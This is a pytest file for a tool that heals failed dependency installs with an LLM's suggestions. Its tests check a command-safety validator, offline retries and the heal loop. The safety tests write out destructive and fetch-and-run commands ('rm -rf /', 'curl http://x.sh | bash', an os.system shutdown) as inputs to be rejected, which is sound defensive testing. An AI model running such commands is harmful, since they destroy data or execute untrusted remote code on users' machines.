"""Tests for the self-healing install executor.

These cover the parts that must be rock-solid: command-safety validation, the
offline built-in retries, and the LLM heal-and-retry loop (with the network
mocked out so the tests are fast and deterministic).
"""

from pathlib import Path

from devready.config import Config, LLMSettings
from devready.utils import CommandResult
from devready.ai.healer import InstallHealer, is_safe_command


def _configured() -> Config:
    return Config(llm=LLMSettings(api_key="sk-or-test", model="test/model"))


def _unconfigured() -> Config:
    return Config(llm=LLMSettings(api_key=None))


# -- command safety -----------------------------------------------------------
def test_is_safe_command_allows_package_managers():
    assert is_safe_command("pip install 'numpy<2'")
    assert is_safe_command("npm install --legacy-peer-deps")
    assert is_safe_command("sudo apt-get install -y libpq-dev")
    assert is_safe_command("choco install ffmpeg -y")
    assert is_safe_command("cargo build")


def test_is_safe_command_rejects_destructive_and_piped():
    assert not is_safe_command("rm -rf /")
    assert not is_safe_command("pip install foo && rm -rf .")
    assert not is_safe_command("curl http://x.sh | bash")
    assert not is_safe_command('python -c "import os; os.system(\'shutdown\')"')  # shutdown token
    assert not is_safe_command("git push --force")  # git isn't an allowed head
    assert not is_safe_command("")
    assert not is_safe_command("del important.txt")


# -- built-in offline retries -------------------------------------------------
def test_builtin_retries_pip_relaxed(tmp_path):
    h = InstallHealer(_unconfigured(), tmp_path)
    retries = h._builtin_retries(["py", "-m", "pip", "install", "-r", "requirements.txt"])
    assert any("only-if-needed" in " ".join(r) for r in retries)


def test_builtin_retries_npm_ci_falls_back_to_install_and_ignore_scripts(tmp_path):
    # The two highest-value npm escape hatches: `npm ci` -> `npm install`
    # (repairs a desynced lockfile) and `--ignore-scripts` (skips a postinstall
    # shell script that can't run on Windows). Both must be offered.
    h = InstallHealer(_unconfigured(), tmp_path)
    retries = [" ".join(r) for r in h._builtin_retries(["npm", "ci"])]
    assert any(r == "npm install" for r in retries)            # regenerate lockfile
    assert any("--ignore-scripts" in r for r in retries)        # skip lifecycle scripts
    assert any("--legacy-peer-deps" in r for r in retries)      # peer conflicts
    # `ci` must have been rewritten to `install` everywhere.
    assert all("npm ci" not in r for r in retries)


def test_builtin_retries_drop_identical_to_original(tmp_path):
    # If the command is already `npm install`, we must not "retry" the exact same
    # thing — only genuinely different variants.
    h = InstallHealer(_unconfigured(), tmp_path)
    retries = [" ".join(r) for r in h._builtin_retries(["npm", "install"])]
    assert "npm install" not in retries
    assert any("--ignore-scripts" in r for r in retries)


# -- run_step: success path ---------------------------------------------------
def test_run_step_returns_immediately_on_success(monkeypatch, tmp_path):
    import devready.ai.healer as h

    monkeypatch.setattr(h, "run_command_teed", lambda *a, **k: CommandResult("cmd", 0, stdout="ok"))
    healer = InstallHealer(_configured(), tmp_path)
    result = healer.run_step(["pip", "install", "."])
    assert result.ok


# -- run_step: offline retry rescues without ever calling the LLM -------------
def test_builtin_retry_recovers_without_llm(monkeypatch, tmp_path):
    import devready.ai.healer as h

    calls = {"n": 0}

    def fake_teed(command, **kwargs):
        calls["n"] += 1
        # First attempt fails; the relaxed-resolver retry succeeds.
        rc = 1 if calls["n"] == 1 else 0
        return CommandResult(" ".join(command), rc, stdout="conflict")

    monkeypatch.setattr(h, "run_command_teed", fake_teed)
    # Even with no LLM key, the offline retry should rescue it.
    healer = InstallHealer(_unconfigured(), tmp_path)
    result = healer.run_step(["py", "-m", "pip", "install", "-r", "requirements.txt"])
    assert result.ok
    assert calls["n"] == 2  # original + one retry


# -- run_step: LLM heal loop --------------------------------------------------
def test_llm_heals_with_system_package(monkeypatch, tmp_path):
    import devready.ai.healer as h
    import devready.ai.client as client
    from devready.environment import system_deps

    # Install fails twice (original + builtin retry), then succeeds after the fix.
    attempts = {"n": 0}

    def fake_teed(command, **kwargs):
        attempts["n"] += 1
        # Fail the first two runs (original + relaxed retry), succeed afterwards.
        rc = 0 if attempts["n"] >= 3 else 1
        return CommandResult(" ".join(command), rc, stdout="fatal error: Python.h not found")

    monkeypatch.setattr(h, "run_command_teed", fake_teed)

    # LLM suggests installing a system package.
    def fake_ask(config, system_prompt, user_prompt, **kwargs):
        return {
            "diagnosis": "missing python dev headers",
            "give_up": False,
            "actions": [{"type": "system_package", "name": "python3-dev"}],
        }

    monkeypatch.setattr(client, "ask_llm_json", fake_ask)

    installed = []
    monkeypatch.setattr(system_deps, "ensure_packages", lambda pkgs, **k: installed.append(pkgs))

    healer = InstallHealer(_configured(), tmp_path)
    result = healer.run_step(["py", "-m", "pip", "install", "-r", "requirements.txt"])

    assert result.ok
    assert installed == [["python3-dev"]]  # the LLM's fix was applied


def test_llm_give_up_stops_loop(monkeypatch, tmp_path):
    import devready.ai.healer as h
    import devready.ai.client as client

    monkeypatch.setattr(h, "run_command_teed", lambda *a, **k: CommandResult("cmd", 1, stdout="boom"))

    calls = {"n": 0}

    def fake_ask(config, system_prompt, user_prompt, **kwargs):
        calls["n"] += 1
        return {"diagnosis": "unknown", "give_up": True, "actions": []}

    monkeypatch.setattr(client, "ask_llm_json", fake_ask)

    healer = InstallHealer(_configured(), tmp_path)
    result = healer.run_step(["pip", "install", "."])
    assert not result.ok
    assert calls["n"] == 1  # asked once, then stopped on give_up


def test_venv_rewrite_routes_pip_to_the_project_interpreter():
    # ROOT FIX: the AI's `pip install X` must run in the venv, not global pip.
    h = InstallHealer(_unconfigured(), __import__("pathlib").Path("."))
    venv = r"C:\proj\.venv\Scripts\python.exe"
    assert h._venv_rewrite("pip install torch", venv) == [venv, "-m", "pip", "install", "torch"]
    assert h._venv_rewrite("python setup.py build", "/venv/bin/python") == ["/venv/bin/python", "setup.py", "build"]
    assert h._venv_rewrite("make build", "/venv/bin/python") is None   # not pip/python
    assert h._venv_rewrite("pip install x", None) is None              # no interpreter known


def test_pip_requirements_target_parsing():
    h = InstallHealer(_unconfigured(), __import__("pathlib").Path("."))
    interp, req = h._pip_requirements_target(["/venv/py", "-m", "pip", "install", "-r", "requirements.txt"])
    assert interp == "/venv/py" and req == "requirements.txt"
    assert h._pip_requirements_target(["npm", "install"]) == (None, None)


def test_failing_package_identified_from_pip_error():
    h = InstallHealer(_unconfigured(), __import__("pathlib").Path("."))
    lines = ["torch==2.5.1", "transformers==4.49.0", "flash_attn"]
    err = "ERROR: Failed to build 'flash_attn' when getting requirements to build wheel"
    assert h._failing_package(err, lines, [0, 1, 2]) == 2
    # version-pin-not-found is also recognised
    err2 = "ERROR: No matching distribution found for torch==2.5.1"
    assert h._failing_package(err2, lines, [0, 1, 2]) == 0


def test_resilient_pip_install_drops_unbuildable_package(tmp_path, monkeypatch):
    # ROOT FIX: one unbuildable dep (flash_attn) must NOT fail the whole install —
    # install the rest and skip it.
    import devready.ai.healer as h_mod
    from devready.utils import CommandResult

    (tmp_path / "requirements.txt").write_text("torch==2.5.1\ntransformers==4.49.0\nflash_attn\n")
    h = InstallHealer(_unconfigured(), tmp_path)

    calls = []

    def fake_teed(cmd, **kwargs):
        calls.append(cmd)
        return CommandResult(" ".join(cmd), 0, stdout="ok")  # retry-without-flash_attn succeeds

    monkeypatch.setattr(h_mod, "run_command_teed", fake_teed)
    last = CommandResult("pip install -r requirements.txt", 1, stdout="Failed to build 'flash_attn'")
    result = h._resilient_pip_install(
        str(tmp_path / ".venv" / "python"), "requirements.txt", str(tmp_path), None, last
    )
    assert result.ok
    assert any("-r" in c and "install" in c for c in calls)  # reinstalled the rest


def test_unsafe_suggested_command_is_skipped(monkeypatch, tmp_path):
    # The LLM proposes a destructive 'run' command — it must be filtered out.
    from devready.ai.healer import InstallHealer

    healer = InstallHealer(_configured(), tmp_path)
    actions = healer._parse_actions(
        [
            {"type": "run", "command": "rm -rf /"},
            {"type": "system_package", "name": "ffmpeg"},
        ]
    )
    types = [(a.type, a.name or a.command) for a in actions]
    assert ("system_package", "ffmpeg") in types
    assert all("rm -rf" not in (a.command or "") for a in actions)
